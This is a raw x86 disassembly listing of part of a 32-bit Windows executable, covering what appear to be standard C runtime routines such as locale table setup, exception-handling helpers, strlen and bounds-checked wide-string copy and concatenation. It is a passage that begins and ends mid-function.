  42227e:	xor    eax,eax
  422280:	pop    ebp
  422281:	ret    
  422282:	mov    eax,ds:0x42af98
  422287:	pop    ebp
  422288:	ret    
  422289:	mov    eax,ds:0x42af94
  42228e:	pop    ebp
  42228f:	ret    
  422290:	mov    eax,ds:0x42af90
  422295:	pop    ebp
  422296:	ret    
  422297:	mov    eax,ds:0x42af8c
  42229c:	pop    ebp
  42229d:	ret    
  42229e:	push   ebp
  42229f:	mov    ebp,esp
  4222a1:	sub    esp,0x10
  4222a4:	lea    ecx,[ebp-0x10]
  4222a7:	push   0x0
  4222a9:	call   0x4207b2
  4222ae:	and    DWORD PTR ds:0x4327a4,0x0
  4222b5:	mov    eax,DWORD PTR [ebp+0x8]
  4222b8:	cmp    eax,0xfffffffe
  4222bb:	jne    0x4222cf
  4222bd:	mov    DWORD PTR ds:0x4327a4,0x1
  4222c7:	call   DWORD PTR ds:0x4290d4
  4222cd:	jmp    0x4222fb
  4222cf:	cmp    eax,0xfffffffd
  4222d2:	jne    0x4222e6
  4222d4:	mov    DWORD PTR ds:0x4327a4,0x1
  4222de:	call   DWORD PTR ds:0x4290d0
  4222e4:	jmp    0x4222fb
  4222e6:	cmp    eax,0xfffffffc
  4222e9:	jne    0x4222fb
  4222eb:	mov    eax,DWORD PTR [ebp-0x10]
  4222ee:	mov    DWORD PTR ds:0x4327a4,0x1
  4222f8:	mov    eax,DWORD PTR [eax+0x4]
  4222fb:	cmp    BYTE PTR [ebp-0x4],0x0
  4222ff:	je     0x422308
  422301:	mov    ecx,DWORD PTR [ebp-0x8]
  422304:	and    DWORD PTR [ecx+0x70],0xfffffffd
  422308:	mov    esp,ebp
  42230a:	pop    ebp
  42230b:	ret    
  42230c:	push   ebp
  42230d:	mov    ebp,esp
  42230f:	push   ebx
  422310:	mov    ebx,DWORD PTR [ebp+0x8]
  422313:	push   esi
  422314:	push   edi
  422315:	push   0x101
  42231a:	xor    edi,edi
  42231c:	lea    esi,[ebx+0x18]
  42231f:	push   edi
  422320:	push   esi
  422321:	call   0x423190
  422326:	mov    DWORD PTR [ebx+0x4],edi
  422329:	xor    eax,eax
  42232b:	mov    DWORD PTR [ebx+0x8],edi
  42232e:	add    esp,0xc
  422331:	mov    DWORD PTR [ebx+0x21c],edi
  422337:	mov    ecx,0x101
  42233c:	lea    edi,[ebx+0xc]
  42233f:	stos   DWORD PTR es:[edi],eax
  422340:	stos   DWORD PTR es:[edi],eax
  422341:	stos   DWORD PTR es:[edi],eax
  422342:	mov    edi,0x430db0
  422347:	sub    edi,ebx
  422349:	mov    al,BYTE PTR [edi+esi*1]
  42234c:	mov    BYTE PTR [esi],al
  42234e:	inc    esi
  42234f:	dec    ecx
  422350:	jne    0x422349
  422352:	lea    ecx,[ebx+0x119]
  422358:	mov    edx,0x100
  42235d:	mov    al,BYTE PTR [ecx+edi*1]
  422360:	mov    BYTE PTR [ecx],al
  422362:	inc    ecx
  422363:	dec    edx
  422364:	jne    0x42235d
  422366:	pop    edi
  422367:	pop    esi
  422368:	pop    ebx
  422369:	pop    ebp
  42236a:	ret    
  42236b:	push   ebp
  42236c:	mov    ebp,esp
  42236e:	sub    esp,0x520
  422374:	mov    eax,ds:0x4314e0
  422379:	xor    eax,ebp
  42237b:	mov    DWORD PTR [ebp-0x4],eax
  42237e:	push   ebx
  42237f:	push   esi
  422380:	mov    esi,DWORD PTR [ebp+0x8]
  422383:	lea    eax,[ebp-0x518]
  422389:	push   edi
  42238a:	push   eax
  42238b:	push   DWORD PTR [esi+0x4]
  42238e:	call   DWORD PTR ds:0x4290d8
  422394:	xor    ebx,ebx
  422396:	mov    edi,0x100
  42239b:	test   eax,eax
  42239d:	je     0x422493
  4223a3:	mov    eax,ebx
  4223a5:	mov    BYTE PTR [ebp+eax*1-0x104],al
  4223ac:	inc    eax
  4223ad:	cmp    eax,edi
  4223af:	jb     0x4223a5
  4223b1:	mov    al,BYTE PTR [ebp-0x512]
  4223b7:	lea    ecx,[ebp-0x512]
  4223bd:	mov    BYTE PTR [ebp-0x104],0x20
  4223c4:	jmp    0x4223e5
  4223c6:	movzx  edx,BYTE PTR [ecx+0x1]
  4223ca:	movzx  eax,al
  4223cd:	jmp    0x4223dc
  4223cf:	cmp    eax,edi
  4223d1:	jae    0x4223e0
  4223d3:	mov    BYTE PTR [ebp+eax*1-0x104],0x20
  4223db:	inc    eax
  4223dc:	cmp    eax,edx
  4223de:	jbe    0x4223cf
  4223e0:	add    ecx,0x2
  4223e3:	mov    al,BYTE PTR [ecx]
  4223e5:	test   al,al
  4223e7:	jne    0x4223c6
  4223e9:	push   ebx
  4223ea:	push   DWORD PTR [esi+0x4]
  4223ed:	lea    eax,[ebp-0x504]
  4223f3:	push   eax
  4223f4:	push   edi
  4223f5:	lea    eax,[ebp-0x104]
  4223fb:	push   eax
  4223fc:	push   0x1
  4223fe:	push   ebx
  4223ff:	call   0x41faf2
  422404:	push   ebx
  422405:	push   DWORD PTR [esi+0x4]
  422408:	lea    eax,[ebp-0x204]
  42240e:	push   edi
  42240f:	push   eax
  422410:	push   edi
  422411:	lea    eax,[ebp-0x104]
  422417:	push   eax
  422418:	push   edi
  422419:	push   DWORD PTR [esi+0x21c]
  42241f:	push   ebx
  422420:	call   0x4215f5
  422425:	add    esp,0x40
  422428:	lea    eax,[ebp-0x304]
  42242e:	push   ebx
  42242f:	push   DWORD PTR [esi+0x4]
  422432:	push   edi
  422433:	push   eax
  422434:	push   edi
  422435:	lea    eax,[ebp-0x104]
  42243b:	push   eax
  42243c:	push   0x200
  422441:	push   DWORD PTR [esi+0x21c]
  422447:	push   ebx
  422448:	call   0x4215f5
  42244d:	add    esp,0x24
  422450:	mov    ecx,ebx
  422452:	movzx  eax,WORD PTR [ebp+ecx*2-0x504]
  42245a:	test   al,0x1
  42245c:	je     0x42246c
  42245e:	or     BYTE PTR [esi+ecx*1+0x19],0x10
  422463:	mov    al,BYTE PTR [ebp+ecx*1-0x204]
  42246a:	jmp    0x42247c
  42246c:	test   al,0x2
  42246e:	je     0x422485
  422470:	or     BYTE PTR [esi+ecx*1+0x19],0x20
  422475:	mov    al,BYTE PTR [ebp+ecx*1-0x304]
  42247c:	mov    BYTE PTR [esi+ecx*1+0x119],al
  422483:	jmp    0x42248c
  422485:	mov    BYTE PTR [esi+ecx*1+0x119],bl
  42248c:	inc    ecx
  42248d:	cmp    ecx,edi
  42248f:	jb     0x422452
  422491:	jmp    0x4224ec
  422493:	push   0xffffff9f
  422495:	lea    edx,[esi+0x119]
  42249b:	mov    ecx,ebx
  42249d:	pop    eax
  42249e:	sub    eax,edx
  4224a0:	mov    DWORD PTR [ebp-0x520],eax
  4224a6:	add    edx,ecx
  4224a8:	add    eax,edx
  4224aa:	mov    DWORD PTR [ebp-0x51c],eax
  4224b0:	add    eax,0x20
  4224b3:	cmp    eax,0x19
  4224b6:	ja     0x4224c2
  4224b8:	or     BYTE PTR [esi+ecx*1+0x19],0x10
  4224bd:	lea    eax,[ecx+0x20]
  4224c0:	jmp    0x4224d5
  4224c2:	cmp    DWORD PTR [ebp-0x51c],0x19
  4224c9:	ja     0x4224d9
  4224cb:	lea    eax,[esi+ecx*1]
  4224ce:	or     BYTE PTR [eax+0x19],0x20
  4224d2:	lea    eax,[ecx-0x20]
  4224d5:	mov    BYTE PTR [edx],al
  4224d7:	jmp    0x4224db
  4224d9:	mov    BYTE PTR [edx],bl
  4224db:	mov    eax,DWORD PTR [ebp-0x520]
  4224e1:	lea    edx,[esi+0x119]
  4224e7:	inc    ecx
  4224e8:	cmp    ecx,edi
  4224ea:	jb     0x4224a6
  4224ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ef:	pop    edi
  4224f0:	pop    esi
  4224f1:	xor    ecx,ebp
  4224f3:	pop    ebx
  4224f4:	call   0x421878
  4224f9:	mov    esp,ebp
  4224fb:	pop    ebp
  4224fc:	ret    
  4224fd:	push   ebp
  4224fe:	mov    ebp,esp
  422500:	sub    esp,0x328
  422506:	mov    eax,ds:0x4314e0
  42250b:	xor    eax,ebp
  42250d:	mov    DWORD PTR [ebp-0x4],eax
  422510:	cmp    DWORD PTR [ebp+0x8],0xffffffff
  422514:	push   edi
  422515:	je     0x422520
  422517:	push   DWORD PTR [ebp+0x8]
  42251a:	call   0x420c93
  42251f:	pop    ecx
  422520:	and    DWORD PTR [ebp-0x320],0x0
  422527:	lea    eax,[ebp-0x31c]
  42252d:	push   0x4c
  42252f:	push   0x0
  422531:	push   eax
  422532:	call   0x423190
  422537:	lea    eax,[ebp-0x320]
  42253d:	add    esp,0xc
  422540:	mov    DWORD PTR [ebp-0x328],eax
  422546:	lea    eax,[ebp-0x2d0]
  42254c:	mov    DWORD PTR [ebp-0x324],eax
  422552:	mov    DWORD PTR [ebp-0x220],eax
  422558:	mov    DWORD PTR [ebp-0x224],ecx
  42255e:	mov    DWORD PTR [ebp-0x228],edx
  422564:	mov    DWORD PTR [ebp-0x22c],ebx
  42256a:	mov    DWORD PTR [ebp-0x230],esi
  422570:	mov    DWORD PTR [ebp-0x234],edi
  422576:	data16 mov WORD PTR [ebp-0x208],ss
  42257d:	data16 mov WORD PTR [ebp-0x214],cs
  422584:	data16 mov WORD PTR [ebp-0x238],ds
  42258b:	data16 mov WORD PTR [ebp-0x23c],es
  422592:	data16 mov WORD PTR [ebp-0x240],fs
  422599:	data16 mov WORD PTR [ebp-0x244],gs
  4225a0:	pushf  
  4225a1:	pop    DWORD PTR [ebp-0x210]
  4225a7:	mov    eax,DWORD PTR [ebp+0x4]
  4225aa:	mov    DWORD PTR [ebp-0x218],eax
  4225b0:	lea    eax,[ebp+0x4]
  4225b3:	mov    DWORD PTR [ebp-0x20c],eax
  4225b9:	mov    DWORD PTR [ebp-0x2d0],0x10001
  4225c3:	mov    eax,DWORD PTR [eax-0x4]
  4225c6:	mov    DWORD PTR [ebp-0x21c],eax
  4225cc:	mov    eax,DWORD PTR [ebp+0xc]
  4225cf:	mov    DWORD PTR [ebp-0x320],eax
  4225d5:	mov    eax,DWORD PTR [ebp+0x10]
  4225d8:	mov    DWORD PTR [ebp-0x31c],eax
  4225de:	mov    eax,DWORD PTR [ebp+0x4]
  4225e1:	mov    DWORD PTR [ebp-0x314],eax
  4225e7:	call   DWORD PTR ds:0x4290dc
  4225ed:	mov    edi,eax
  4225ef:	lea    eax,[ebp-0x328]
  4225f5:	push   eax
  4225f6:	call   0x42219c
  4225fb:	pop    ecx
  4225fc:	test   eax,eax
  4225fe:	jne    0x422613
  422600:	test   edi,edi
  422602:	jne    0x422613
  422604:	cmp    DWORD PTR [ebp+0x8],0xffffffff
  422608:	je     0x422613
  42260a:	push   DWORD PTR [ebp+0x8]
  42260d:	call   0x420c93
  422612:	pop    ecx
  422613:	mov    ecx,DWORD PTR [ebp-0x4]
  422616:	xor    ecx,ebp
  422618:	pop    edi
  422619:	call   0x421878
  42261e:	mov    esp,ebp
  422620:	pop    ebp
  422621:	ret    
  422622:	xor    eax,eax
  422624:	push   eax
  422625:	push   eax
  422626:	push   eax
  422627:	push   eax
  422628:	push   eax
  422629:	call   0x41f12e
  42262e:	add    esp,0x14
  422631:	ret    
  422632:	call   0x420bdf
  422637:	test   eax,eax
  422639:	jne    0x422641
  42263b:	mov    eax,0x431234
  422640:	ret    
  422641:	add    eax,0xc
  422644:	ret    
  422645:	push   ebp
  422646:	mov    ebp,esp
  422648:	push   esi
  422649:	call   0x422632
  42264e:	mov    ecx,DWORD PTR [ebp+0x8]
  422651:	push   ecx
  422652:	mov    DWORD PTR [eax],ecx
  422654:	call   0x41f351
  422659:	pop    ecx
  42265a:	mov    esi,eax
  42265c:	call   0x41fb32
  422661:	mov    DWORD PTR [eax],esi
  422663:	pop    esi
  422664:	pop    ebp
  422665:	ret    
  422666:	push   ebp
  422667:	mov    ebp,esp
  422669:	push   ecx
  42266a:	push   ebx
  42266b:	push   esi
  42266c:	mov    esi,DWORD PTR ds:0x429048
  422672:	push   edi
  422673:	push   DWORD PTR ds:0x433bf0
  422679:	call   esi
  42267b:	push   DWORD PTR ds:0x433bec
  422681:	mov    DWORD PTR [ebp-0x4],eax
  422684:	call   esi
  422686:	mov    ebx,eax
  422688:	mov    eax,DWORD PTR [ebp-0x4]
  42268b:	cmp    ebx,eax
  42268d:	jb     0x422715
  422693:	mov    edi,ebx
  422695:	sub    edi,eax
  422697:	lea    ecx,[edi+0x4]
  42269a:	cmp    ecx,0x4
  42269d:	jb     0x422715
  42269f:	push   eax
  4226a0:	call   0x421753
  4226a5:	mov    esi,eax
  4226a7:	lea    eax,[edi+0x4]
  4226aa:	pop    ecx
  4226ab:	cmp    esi,eax
  4226ad:	jae    0x4226f6
  4226af:	mov    eax,0x800
  4226b4:	cmp    esi,eax
  4226b6:	jae    0x4226ba
  4226b8:	mov    eax,esi
  4226ba:	mov    ebx,DWORD PTR [ebp-0x4]
  4226bd:	add    eax,esi
  4226bf:	cmp    eax,esi
  4226c1:	jb     0x4226d0
  4226c3:	push   eax
  4226c4:	push   ebx
  4226c5:	call   0x42159c
  4226ca:	pop    ecx
  4226cb:	pop    ecx
  4226cc:	test   eax,eax
  4226ce:	jne    0x4226e4
  4226d0:	lea    eax,[esi+0x10]
  4226d3:	cmp    eax,esi
  4226d5:	jb     0x422715
  4226d7:	push   eax
  4226d8:	push   ebx
  4226d9:	call   0x42159c
  4226de:	pop    ecx
  4226df:	pop    ecx
  4226e0:	test   eax,eax
  4226e2:	je     0x422715
  4226e4:	sar    edi,0x2
  4226e7:	push   eax
  4226e8:	lea    ebx,[eax+edi*4]
  4226eb:	call   DWORD PTR ds:0x429044
  4226f1:	mov    ds:0x433bf0,eax
  4226f6:	push   DWORD PTR [ebp+0x8]
  4226f9:	call   DWORD PTR ds:0x429044
  4226ff:	lea    ecx,[ebx+0x4]
  422702:	mov    DWORD PTR [ebx],eax
  422704:	push   ecx
  422705:	call   DWORD PTR ds:0x429044
  42270b:	mov    ds:0x433bec,eax
  422710:	mov    eax,DWORD PTR [ebp+0x8]
  422713:	jmp    0x422717
  422715:	xor    eax,eax
  422717:	pop    edi
  422718:	pop    esi
  422719:	pop    ebx
  42271a:	mov    esp,ebp
  42271c:	pop    ebp
  42271d:	ret    
  42271e:	push   ebp
  42271f:	mov    ebp,esp
  422721:	mov    edx,DWORD PTR [ebp+0xc]
  422724:	mov    ecx,DWORD PTR ds:0x429eb0
  42272a:	push   esi
  42272b:	mov    esi,DWORD PTR [ebp+0x8]
  42272e:	cmp    DWORD PTR [edx+0x4],esi
  422731:	je     0x422740
  422733:	imul   eax,ecx,0xc
  422736:	add    edx,0xc
  422739:	add    eax,DWORD PTR [ebp+0xc]
  42273c:	cmp    edx,eax
  42273e:	jb     0x42272e
  422740:	imul   ecx,ecx,0xc
  422743:	add    ecx,DWORD PTR [ebp+0xc]
  422746:	cmp    edx,ecx
  422748:	jae    0x422753
  42274a:	cmp    DWORD PTR [edx+0x4],esi
  42274d:	jne    0x422753
  42274f:	mov    eax,edx
  422751:	jmp    0x422755
  422753:	xor    eax,eax
  422755:	pop    esi
  422756:	pop    ebp
  422757:	ret    
  422758:	int3   
  422759:	int3   
  42275a:	int3   
  42275b:	int3   
  42275c:	int3   
  42275d:	int3   
  42275e:	int3   
  42275f:	int3   
  422760:	push   ebx
  422761:	push   esi
  422762:	push   edi
  422763:	mov    edx,DWORD PTR [esp+0x10]
  422767:	mov    eax,DWORD PTR [esp+0x14]
  42276b:	mov    ecx,DWORD PTR [esp+0x18]
  42276f:	push   ebp
  422770:	push   edx
  422771:	push   eax
  422772:	push   ecx
  422773:	push   ecx
  422774:	push   0x4227f0
  422779:	push   DWORD PTR fs:0x0
  422780:	mov    eax,ds:0x4314e0
  422785:	xor    eax,esp
  422787:	mov    DWORD PTR [esp+0x8],eax
  42278b:	mov    DWORD PTR fs:0x0,esp
  422792:	mov    eax,DWORD PTR [esp+0x30]
  422796:	mov    ebx,DWORD PTR [eax+0x8]
  422799:	mov    ecx,DWORD PTR [esp+0x2c]
  42279d:	xor    ebx,DWORD PTR [ecx]
  42279f:	mov    esi,DWORD PTR [eax+0xc]
  4227a2:	cmp    esi,0xfffffffe
  4227a5:	je     0x4227e2
  4227a7:	mov    edx,DWORD PTR [esp+0x34]
  4227ab:	cmp    edx,0xfffffffe
  4227ae:	je     0x4227b4
  4227b0:	cmp    esi,edx
  4227b2:	jbe    0x4227e2
  4227b4:	lea    esi,[esi+esi*2]
  4227b7:	lea    ebx,[ebx+esi*4+0x10]
  4227bb:	mov    ecx,DWORD PTR [ebx]
  4227bd:	mov    DWORD PTR [eax+0xc],ecx
  4227c0:	cmp    DWORD PTR [ebx+0x4],0x0
  4227c4:	jne    0x422792
  4227c6:	push   0x101
  4227cb:	mov    eax,DWORD PTR [ebx+0x8]
  4227ce:	call   0x423cd5
  4227d3:	mov    ecx,0x1
  4227d8:	mov    eax,DWORD PTR [ebx+0x8]
  4227db:	call   0x423cf4
  4227e0:	jmp    0x422792
  4227e2:	pop    DWORD PTR fs:0x0
  4227e9:	add    esp,0x18
  4227ec:	pop    edi
  4227ed:	pop    esi
  4227ee:	pop    ebx
  4227ef:	ret    
  4227f0:	mov    ecx,DWORD PTR [esp+0x4]
  4227f4:	test   DWORD PTR [ecx+0x4],0x6
  4227fb:	mov    eax,0x1
  422800:	je     0x422835
  422802:	mov    eax,DWORD PTR [esp+0x8]
  422806:	mov    ecx,DWORD PTR [eax+0x8]
  422809:	xor    ecx,eax
  42280b:	call   0x421878
  422810:	push   ebp
  422811:	mov    ebp,DWORD PTR [eax+0x18]
  422814:	push   DWORD PTR [eax+0xc]
  422817:	push   DWORD PTR [eax+0x10]
  42281a:	push   DWORD PTR [eax+0x14]
  42281d:	call   0x422760
  422822:	add    esp,0xc
  422825:	pop    ebp
  422826:	mov    eax,DWORD PTR [esp+0x8]
  42282a:	mov    edx,DWORD PTR [esp+0x10]
  42282e:	mov    DWORD PTR [edx],eax
  422830:	mov    eax,0x3
  422835:	ret    
  422836:	push   ebp
  422837:	mov    ecx,DWORD PTR [esp+0x8]
  42283b:	mov    ebp,DWORD PTR [ecx]
  42283d:	push   DWORD PTR [ecx+0x1c]
  422840:	push   DWORD PTR [ecx+0x18]
  422843:	push   DWORD PTR [ecx+0x28]
  422846:	call   0x422760
  42284b:	add    esp,0xc
  42284e:	pop    ebp
  42284f:	ret    0x4
  422852:	push   ebp
  422853:	push   esi
  422854:	push   edi
  422855:	push   ebx
  422856:	mov    ebp,edx
  422858:	xor    eax,eax
  42285a:	xor    ebx,ebx
  42285c:	xor    edx,edx
  42285e:	xor    esi,esi
  422860:	xor    edi,edi
  422862:	call   ecx
  422864:	pop    ebx
  422865:	pop    edi
  422866:	pop    esi
  422867:	pop    ebp
  422868:	ret    
  422869:	mov    ebp,edx
  42286b:	mov    esi,ecx
  42286d:	mov    eax,ecx
  42286f:	push   0x1
  422871:	call   0x423cd5
  422876:	xor    eax,eax
  422878:	xor    ebx,ebx
  42287a:	xor    ecx,ecx
  42287c:	xor    edx,edx
  42287e:	xor    edi,edi
  422880:	jmp    esi
  422882:	push   ebp
  422883:	mov    ebp,esp
  422885:	push   ebx
  422886:	push   esi
  422887:	push   edi
  422888:	push   0x0
  42288a:	push   edx
  42288b:	push   0x422896
  422890:	push   ecx
  422891:	call   0x410018
  422896:	pop    edi
  422897:	pop    esi
  422898:	pop    ebx
  422899:	pop    ebp
  42289a:	ret    
  42289b:	push   ebp
  42289c:	mov    ebp,DWORD PTR [esp+0x8]
  4228a0:	push   edx
  4228a1:	push   ecx
  4228a2:	push   DWORD PTR [esp+0x14]
  4228a6:	call   0x422760
  4228ab:	add    esp,0xc
  4228ae:	pop    ebp
  4228af:	ret    0x8
  4228b2:	mov    eax,ds:0x433b44
  4228b7:	push   esi
  4228b8:	push   0x14
  4228ba:	pop    esi
  4228bb:	test   eax,eax
  4228bd:	jne    0x4228c6
  4228bf:	mov    eax,0x200
  4228c4:	jmp    0x4228cc
  4228c6:	cmp    eax,esi
  4228c8:	jge    0x4228d1
  4228ca:	mov    eax,esi
  4228cc:	mov    ds:0x433b44,eax
  4228d1:	push   0x4
  4228d3:	push   eax
  4228d4:	call   0x41ef78
  4228d9:	mov    ds:0x433b40,eax
  4228de:	pop    ecx
  4228df:	pop    ecx
  4228e0:	test   eax,eax
  4228e2:	jne    0x422902
  4228e4:	push   0x4
  4228e6:	push   esi
  4228e7:	mov    DWORD PTR ds:0x433b44,esi
  4228ed:	call   0x41ef78
  4228f2:	mov    ds:0x433b40,eax
  4228f7:	pop    ecx
  4228f8:	pop    ecx
  4228f9:	test   eax,eax
  4228fb:	jne    0x422902
  4228fd:	push   0x1a
  4228ff:	pop    eax
  422900:	pop    esi
  422901:	ret    
  422902:	xor    edx,edx
  422904:	mov    ecx,0x431260
  422909:	mov    DWORD PTR [edx+eax*1],ecx
  42290c:	add    ecx,0x20
  42290f:	lea    edx,[edx+0x4]
  422912:	cmp    ecx,0x4314e0
  422918:	jge    0x422921
  42291a:	mov    eax,ds:0x433b40
  42291f:	jmp    0x422909
  422921:	xor    eax,eax
  422923:	pop    esi
  422924:	ret    
  422925:	call   0x423ac6
  42292a:	cmp    BYTE PTR ds:0x431de0,0x0
  422931:	je     0x422938
  422933:	call   0x423cf7
  422938:	push   DWORD PTR ds:0x433b40
  42293e:	call   0x41f0cb
  422943:	and    DWORD PTR ds:0x433b40,0x0
  42294a:	pop    ecx
  42294b:	ret    
  42294c:	push   ebp
  42294d:	mov    ebp,esp
  42294f:	push   esi
  422950:	mov    esi,DWORD PTR [ebp+0x8]
  422953:	mov    ecx,0x431260
  422958:	cmp    esi,ecx
  42295a:	jb     0x42297e
  42295c:	cmp    esi,0x4314c0
  422962:	ja     0x42297e
  422964:	mov    eax,esi
  422966:	sub    eax,ecx
  422968:	sar    eax,0x5
  42296b:	add    eax,0x10
  42296e:	push   eax
  42296f:	call   0x41fabe
  422974:	or     DWORD PTR [esi+0xc],0x8000
  42297b:	pop    ecx
  42297c:	jmp    0x422988
  42297e:	lea    eax,[esi+0x20]
  422981:	push   eax
  422982:	call   DWORD PTR ds:0x4290c0
  422988:	pop    esi
  422989:	pop    ebp
  42298a:	ret    
  42298b:	push   ebp
  42298c:	mov    ebp,esp
  42298e:	mov    eax,DWORD PTR [ebp+0x8]
  422991:	cmp    eax,0x14
  422994:	jge    0x4229ac
  422996:	add    eax,0x10
  422999:	push   eax
  42299a:	call   0x41fabe
  42299f:	mov    eax,DWORD PTR [ebp+0xc]
  4229a2:	pop    ecx
  4229a3:	or     DWORD PTR [eax+0xc],0x8000
  4229aa:	pop    ebp
  4229ab:	ret    
  4229ac:	mov    eax,DWORD PTR [ebp+0xc]
  4229af:	add    eax,0x20
  4229b2:	push   eax
  4229b3:	call   DWORD PTR ds:0x4290c0
  4229b9:	pop    ebp
  4229ba:	ret    
  4229bb:	push   ebp
  4229bc:	mov    ebp,esp
  4229be:	mov    eax,DWORD PTR [ebp+0x8]
  4229c1:	mov    ecx,0x431260
  4229c6:	cmp    eax,ecx
  4229c8:	jb     0x4229e9
  4229ca:	cmp    eax,0x4314c0
  4229cf:	ja     0x4229e9
  4229d1:	and    DWORD PTR [eax+0xc],0xffff7fff
  4229d8:	sub    eax,ecx
  4229da:	sar    eax,0x5
  4229dd:	add    eax,0x10
  4229e0:	push   eax
  4229e1:	call   0x421933
  4229e6:	pop    ecx
  4229e7:	pop    ebp
  4229e8:	ret    
  4229e9:	add    eax,0x20
  4229ec:	push   eax
  4229ed:	call   DWORD PTR ds:0x4290c4
  4229f3:	pop    ebp
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	mov    ecx,DWORD PTR [ebp+0x8]
  4229fb:	mov    eax,DWORD PTR [ebp+0xc]
  4229fe:	cmp    ecx,0x14
  422a01:	jge    0x422a16
  422a03:	and    DWORD PTR [eax+0xc],0xffff7fff
  422a0a:	lea    eax,[ecx+0x10]
  422a0d:	push   eax
  422a0e:	call   0x421933
  422a13:	pop    ecx
  422a14:	pop    ebp
  422a15:	ret    
  422a16:	add    eax,0x20
  422a19:	push   eax
  422a1a:	call   DWORD PTR ds:0x4290c4
  422a20:	pop    ebp
  422a21:	ret    
  422a22:	push   ebp
  422a23:	mov    ebp,esp
  422a25:	sub    esp,0x10
  422a28:	push   esi
  422a29:	push   DWORD PTR [ebp+0x8]
  422a2c:	lea    ecx,[ebp-0x10]
  422a2f:	call   0x4207b2
  422a34:	mov    eax,DWORD PTR [ebp+0xc]
  422a37:	mov    cl,BYTE PTR [ebp+0x14]
  422a3a:	movzx  esi,al
  422a3d:	mov    eax,DWORD PTR [ebp-0xc]
  422a40:	test   BYTE PTR [eax+esi*1+0x19],cl
  422a44:	jne    0x422a65
  422a46:	xor    edx,edx
  422a48:	cmp    DWORD PTR [ebp+0x10],edx
  422a4b:	je     0x422a5f
  422a4d:	mov    eax,DWORD PTR [ebp-0x10]
  422a50:	mov    eax,DWORD PTR [eax+0x90]
  422a56:	movzx  eax,WORD PTR [eax+esi*2]
  422a5a:	and    eax,DWORD PTR [ebp+0x10]
  422a5d:	jmp    0x422a61
  422a5f:	mov    eax,edx
  422a61:	test   eax,eax
  422a63:	je     0x422a68
  422a65:	xor    edx,edx
  422a67:	inc    edx
  422a68:	cmp    BYTE PTR [ebp-0x4],0x0
  422a6c:	pop    esi
  422a6d:	je     0x422a76
  422a6f:	mov    ecx,DWORD PTR [ebp-0x8]
  422a72:	and    DWORD PTR [ecx+0x70],0xfffffffd
  422a76:	mov    eax,edx
  422a78:	mov    esp,ebp
  422a7a:	pop    ebp
  422a7b:	ret    
  422a7c:	int3   
  422a7d:	int3   
  422a7e:	int3   
  422a7f:	int3   
  422a80:	mov    ecx,DWORD PTR [esp+0x4]
  422a84:	test   ecx,0x3
  422a8a:	je     0x422ab0
  422a8c:	mov    al,BYTE PTR [ecx]
  422a8e:	add    ecx,0x1
  422a91:	test   al,al
  422a93:	je     0x422ae3
  422a95:	test   ecx,0x3
  422a9b:	jne    0x422a8c
  422a9d:	add    eax,0x0
  422aa2:	lea    esp,[esp+0x0]
  422aa9:	lea    esp,[esp+0x0]
  422ab0:	mov    eax,DWORD PTR [ecx]
  422ab2:	mov    edx,0x7efefeff
  422ab7:	add    edx,eax
  422ab9:	xor    eax,0xffffffff
  422abc:	xor    eax,edx
  422abe:	add    ecx,0x4
  422ac1:	test   eax,0x81010100
  422ac6:	je     0x422ab0
  422ac8:	mov    eax,DWORD PTR [ecx-0x4]
  422acb:	test   al,al
  422acd:	je     0x422b01
  422acf:	test   ah,ah
  422ad1:	je     0x422af7
  422ad3:	test   eax,0xff0000
  422ad8:	je     0x422aed
  422ada:	test   eax,0xff000000
  422adf:	je     0x422ae3
  422ae1:	jmp    0x422ab0
  422ae3:	lea    eax,[ecx-0x1]
  422ae6:	mov    ecx,DWORD PTR [esp+0x4]
  422aea:	sub    eax,ecx
  422aec:	ret    
  422aed:	lea    eax,[ecx-0x2]
  422af0:	mov    ecx,DWORD PTR [esp+0x4]
  422af4:	sub    eax,ecx
  422af6:	ret    
  422af7:	lea    eax,[ecx-0x3]
  422afa:	mov    ecx,DWORD PTR [esp+0x4]
  422afe:	sub    eax,ecx
  422b00:	ret    
  422b01:	lea    eax,[ecx-0x4]
  422b04:	mov    ecx,DWORD PTR [esp+0x4]
  422b08:	sub    eax,ecx
  422b0a:	ret    
  422b0b:	push   ebp
  422b0c:	mov    ebp,esp
  422b0e:	push   esi
  422b0f:	push   edi
  422b10:	mov    edi,DWORD PTR [ebp+0x8]
  422b13:	test   edi,edi
  422b15:	je     0x422b2a
  422b17:	mov    ecx,DWORD PTR [ebp+0xc]
  422b1a:	test   ecx,ecx
  422b1c:	je     0x422b2a
  422b1e:	mov    edx,DWORD PTR [ebp+0x10]
  422b21:	test   edx,edx
  422b23:	jne    0x422b3f
  422b25:	xor    eax,eax
  422b27:	mov    WORD PTR [edi],ax
  422b2a:	call   0x41fb32
  422b2f:	push   0x16
  422b31:	pop    esi
  422b32:	mov    DWORD PTR [eax],esi
  422b34:	call   0x422622
  422b39:	mov    eax,esi
  422b3b:	pop    edi
  422b3c:	pop    esi
  422b3d:	pop    ebp
  422b3e:	ret    
  422b3f:	mov    esi,edi
  422b41:	cmp    WORD PTR [esi],0x0
  422b45:	je     0x422b4d
  422b47:	add    esi,0x2
  422b4a:	dec    ecx
  422b4b:	jne    0x422b41
  422b4d:	test   ecx,ecx
  422b4f:	je     0x422b25
  422b51:	sub    esi,edx
  422b53:	movzx  eax,WORD PTR [edx]
  422b56:	mov    WORD PTR [esi+edx*1],ax
  422b5a:	lea    edx,[edx+0x2]
  422b5d:	test   ax,ax
  422b60:	je     0x422b65
  422b62:	dec    ecx
  422b63:	jne    0x422b53
  422b65:	xor    eax,eax
  422b67:	test   ecx,ecx
  422b69:	jne    0x422b3b
  422b6b:	mov    WORD PTR [edi],ax
  422b6e:	call   0x41fb32
  422b73:	push   0x22
  422b75:	jmp    0x422b31
  422b77:	push   ebp
  422b78:	mov    ebp,esp
  422b7a:	push   esi
  422b7b:	mov    esi,DWORD PTR [ebp+0x8]
  422b7e:	test   esi,esi
  422b80:	je     0x422b95
  422b82:	mov    edx,DWORD PTR [ebp+0xc]
  422b85:	test   edx,edx
  422b87:	je     0x422b95
  422b89:	mov    ecx,DWORD PTR [ebp+0x10]
  422b8c:	test   ecx,ecx
  422b8e:	jne    0x422ba9
  422b90:	xor    eax,eax
  422b92:	mov    WORD PTR [esi],ax
  422b95:	call   0x41fb32
  422b9a:	push   0x16
  422b9c:	pop    esi
  422b9d:	mov    DWORD PTR [eax],esi
  422b9f:	call   0x422622
  422ba4:	mov    eax,esi
  422ba6:	pop    esi
